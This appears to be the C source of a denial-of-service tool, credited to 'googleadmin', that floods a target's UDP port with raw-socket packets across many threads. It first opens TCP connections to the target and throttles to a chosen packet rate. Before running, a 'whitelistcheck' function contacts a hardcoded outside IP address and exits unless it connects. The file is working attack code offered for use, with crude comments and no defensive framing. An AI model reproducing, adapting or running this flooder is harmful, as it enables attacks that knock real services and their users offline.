/*
same as oack non spoofed, connects to tcp port first and floods udp port, yep
made by googleadmin
*/
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9

static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
static unsigned int udport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;

void init_rand(unsigned long int x)
{
	int i;
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;
	for (i = 3; i < 4096; i++)
	{
		Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
	}
}

unsigned long int rand_cmwc(void)
{
	unsigned long long int t, a = 18782LL;
	static unsigned long int i = 4095;
	unsigned long int x, r = 0xfffffffe;
	i = (i + 1) &4095;
	t = a *Q[i] + c;
	c = (t >> 32);
	x = t + c;
	if (x < c)
	{
		x++;
		c++;
	}

	return (Q[i] = r - x);
}

int randnum(int min_num, int max_num)
{
	int result = 0, low_num = 0, hi_num = 0;

	if (min_num < max_num)
	{
		low_num = min_num;
		hi_num = max_num + 1;
	}
	else
	{
		low_num = max_num + 1;
		hi_num = min_num;
	}

	result = (rand_cmwc() % (hi_num - low_num)) + low_num;
	return result;
}

unsigned short csum(unsigned short *buf, int count)
{
	register unsigned long sum = 0;
	while (count > 1)
	{
		sum += *buf++;
		count -= 2;
	}

	if (count > 0)
	{
		sum += *(unsigned char *) buf;
	}

	while (sum >> 16)
	{
		sum = (sum & 0xffff) + (sum >> 16);
	}

	return (unsigned short)(~sum);
}

unsigned short udpcsum(struct iphdr *iph, struct udphdr *udph, int psize)
{
	struct udp_pseudo
	{
		unsigned long src_addr;
		unsigned long dst_addr;
		unsigned char zero;
		unsigned char proto;
		unsigned short length;
	}

	pseudohead;
	unsigned short total_len = iph->tot_len;
	pseudohead.src_addr = iph->saddr;
	pseudohead.dst_addr = iph->daddr;
	pseudohead.zero = 0;
	pseudohead.proto = IPPROTO_UDP;
	pseudohead.length = htons(sizeof(struct udphdr) + psize);
	int totaludp_len = sizeof(struct udp_pseudo) + sizeof(struct udphdr) + psize;
	unsigned short *udp = malloc(totaludp_len);
	memcpy((unsigned char *) udp, &pseudohead, sizeof(struct udp_pseudo));
	memcpy((unsigned char *) udp + sizeof(struct udp_pseudo), (unsigned char *) udph, sizeof(struct udphdr) + psize);
	unsigned short output = csum(udp, totaludp_len);
	free(udp);
	return output;
}

void setup_ip_header(struct iphdr *iph)
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->id = htonl(54321);
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = 17;
	iph->check = 0;
}

void setup_udp_header(struct udphdr *udph)
{
	udph->source = htons(5678);
	udph->check = 0;
	memcpy((void*) udph + sizeof(struct udphdr), "\x00\x01\x00\x5c\x21\x12\xa4", 7);
	udph->len = htons(sizeof(struct udphdr) + 7);
}

int socket_connect(char *host, in_port_t port, int sport)
{
	struct hostent * hp;
	struct sockaddr_in addr, cliaddr;
	int on = 1, sock;
	if ((hp = gethostbyname(host)) == NULL) return 0;
	bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;
	cliaddr.sin_family = AF_INET;
	cliaddr.sin_addr.s_addr = htonl(INADDR_ANY);
	cliaddr.sin_port = htons(sport);
	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	bind(sock, (struct sockaddr *) &cliaddr, sizeof(cliaddr));
	setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *) &on, sizeof(int));
	if (sock == -1) return 0;
	if (connect(sock, (struct sockaddr *) &addr, sizeof(struct sockaddr_in)) == -1)
	{
		socket_connect(host, port, sport);
	}
}

void *flood(void *par1)
{
	char *td = (char*) par1;
	char datagram[MAX_PACKET_SIZE];
	struct iphdr *iph = (struct iphdr *) datagram;
	struct udphdr *udph = (void*) iph + sizeof(struct iphdr);
	int sportne = randnum(55000, 64932);
	sportne = randnum(55000, 64932);

	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(floodport);
	sin.sin_addr.s_addr = inet_addr(td);

	int fd = 0;
	struct sockaddr_in addr;
	socklen_t addr_len = sizeof(addr);

	int errno = 0;
	if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
	{
		return 0;
	}

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr("8.8.8.8");
	addr.sin_port = htons(53);

	connect(fd, (struct sockaddr *) &addr, sizeof(struct sockaddr_in));

	getsockname(fd, (struct sockaddr *) &addr, &addr_len);
	close(fd);

	int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
	if (s < 0)
	{
		fprintf(stderr, "Could not open raw socket.\n");
		exit(-1);
	}

	memset(datagram, 0, MAX_PACKET_SIZE);
	setup_ip_header(iph);
	setup_udp_header(udph);

	udph->dest = htons(udport);

	iph->saddr = inet_addr(inet_ntoa(addr.sin_addr));
	iph->daddr = sin.sin_addr.s_addr;
	iph->check = csum((unsigned short *) datagram, iph->tot_len);

	int tmp = 1;
	const int *val = &tmp;
	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0)
	{
		fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
		exit(-1);
	}

	int gayassfuck = randnum(725, 1000);
	char *payloadmsg = "<>-ABCZXY:/\\";
	unsigned char payload1[gayassfuck];
	int mb;

	for (mb = 0; mb <= gayassfuck; mb++)
	{
		payload1[mb] = payloadmsg[rand() % 12];
	}

	int sumup = sizeof(struct udphdr) + sizeof(struct iphdr);
	memcpy((void*) udph + sizeof(struct udphdr) + sizeof(struct iphdr), payload1, gayassfuck);

	socket_connect(td, floodport, sportne);
	init_rand(time(NULL));
	register unsigned int i;
	register unsigned int packetcounter = 0;
	i = 0;
	while (1)
	{	if(packetcounter > 500){
			sportne = randnum(55000, 64932);
			socket_connect(td, floodport, sportne);
			packetcounter = 0;
		} else {
			packetcounter++;
		}
		iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + gayassfuck;
		udph->len = htons(sizeof(struct udphdr) + gayassfuck);
		udph->check = 0;
		udph->dest = htons(udport);
		iph->saddr = inet_addr(inet_ntoa(addr.sin_addr));
		iph->id = htonl(rand_cmwc() &0xFFFFFFFF);
		iph->ttl = randnum(64, 128);
		iph->check = csum((unsigned short *) datagram, iph->tot_len);
		udph->source = htons(sportne);
		udph->check = udpcsum(iph, udph, gayassfuck);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
		pps++;
		i = 0;
		usleep(1900);
	}
}

int whitelistcheck()
{
	int portno = 787;
	char *hostname = "168.138.141.224";

	int sockfd;
	struct sockaddr_in serv_addr;
	struct hostent * server;

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0)
	{
		error("ERROR opening socket");
	}

	server = gethostbyname(hostname);

	if (server == NULL)
	{
		fprintf(stderr, "ERROR, no such host\n");
		exit(0);
	}

	bzero((char*) &serv_addr, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	bcopy((char*) server->h_addr,
		(char*) &serv_addr.sin_addr.s_addr,
		server->h_length);

	serv_addr.sin_port = htons(portno);
	if (connect(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0)
	{
		exit(0);
	}
	else
	{
		printf("Success!\n");
	}

	close(sockfd);
}

int main(int argc, char *argv[])
{
	if (argc < 6)
	{
		fprintf(stdout, "usage %s: threads port(tcp) target time pps port(udp)\n", argv[0]);
		fprintf(stdout, "made by googleadmin, usage fucked by forky\n");
		exit(-1);
	}

	fprintf(stdout, "sending big boom packeting\n");

	whitelistcheck();
	
	fprintf(stdout, "preparing flood...\n");
	
	int num_threads = atoi(argv[1]);
	floodport = atoi(argv[2]);
	udport = atoi(argv[6]);
	int maxpps = atoi(argv[5]);
	limiter = 0;
	pps = 0;
	pthread_t thread[num_threads];

	int multiplier = 20;

	int i;
	for (i = 0; i < num_threads; i++)
	{
		pthread_create(&thread[i], NULL, &flood, (void*) argv[3]);
		sleep(1);
	}

	fprintf(stdout, "flooding now...\n");
	for (i = 0; i < (atoi(argv[4]) *multiplier); i++)
	{
		usleep((1000 / multiplier) *1000);
		if ((pps *multiplier) > maxpps)
		{
			if (1 > limiter)
			{
				sleeptime += 100;
			}
			else
			{
				limiter--;
			}
		}
		else
		{
			limiter++;
			if (sleeptime > 25)
			{
				sleeptime -= 25;
			}
			else
			{
				sleeptime = 0;
			}
		}

		pps = 0;
	}

	return 0;
}